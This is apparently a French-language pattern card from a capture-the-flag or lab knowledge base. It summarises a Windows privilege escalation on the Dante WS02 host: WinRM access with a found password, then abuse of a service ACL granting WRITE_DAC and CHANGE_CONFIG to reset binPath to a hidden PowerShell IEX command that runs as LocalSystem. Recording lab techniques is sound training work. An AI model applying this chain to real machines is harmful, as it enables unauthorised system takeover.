---
doc_kind: pattern
title: "DANTE WS02 - WinRM credentials puis abus ACL service WRITE_DAC"
category: pwn
slug: ws02-service-acl-write-dac-privesc
created: 2026-10-29
status: active
tags:
  - service-acl-abuse
  - write-dac
  - binpath-hijack
  - evil-winrm
  - windows-privesc
chain_summary: "Un mot de passe trouve donne acces WinRM (Evil-WinRM Ruby requis, pywinrm refuse); l'ACL d'un service accorde SERVICE_CHANGE_CONFIG/WRITE_DAC/WRITE_OWNER permettant de modifier binPath."
---
# DANTE WS02 - WinRM credentials puis abus ACL service WRITE_DAC

## Chain Summary

- One-line chain: Un mot de passe trouve donne acces WinRM (Evil-WinRM Ruby requis, pywinrm refuse); l'ACL d'un service accorde SERVICE_CHANGE_CONFIG/WRITE_DAC/WRITE_OWNER permettant de modifier binPath.

## Preconditions

- Voir le writeup associe pour le contexte precis de la cible.

## Cheap Probes

- Rechercher les signaux initiaux decrits dans la chaine d'exploit ci-dessous.

## Telltale Evidence

- sc.exe sdshow listant l'ACE avec droits CCDCLCSWRPWPLORC; sc.exe qc confirmant le nouveau BINARY_PATH_NAME.

## Escalation Order

1. Creds invalides sur une premiere tentative -> note revele le bon mot de passe.
2. evil-winrm (client Ruby) via proxychains -> flag utilisateur.
3. sc.exe sdshow <service> -> SID utilisateur avec droits CCDCLCSWRPWPLORC (WRITE_DAC/WRITE_OWNER/CHANGE_CONFIG).
4. sc.exe config <service> binPath= 'powershell -w hidden -nop -c IEX(...)'.
5. Redemarrage du service (verifier droits start/stop apres reset).
6. Service AUTO_START execute le payload en LocalSystem au redemarrage -> flag admin.

## Common Mistakes

- Ne pas verifier ce signal/cette condition avant de passer a une autre piste (voir lecon ci-dessous).

## Payload Shapes

```text
Toujours sc.exe sdshow sur les services AUTO_START/LocalSystem pour reperer un WRITE_DAC/CHANGE_CONFIG exploitable par un utilisateur non-admin; pywinrm peut etre refuse alors qu'Evil-WinRM Ruby passe.
```

## Related Writeups

- ws02-service-acl-write-dac-privesc

## Skill Impact

- Related skill: a classer lors d'une prochaine passe skill-maintainer si le pattern se repete.
- Rule to add or update: (backlog only for now; promote if this pattern repeats)
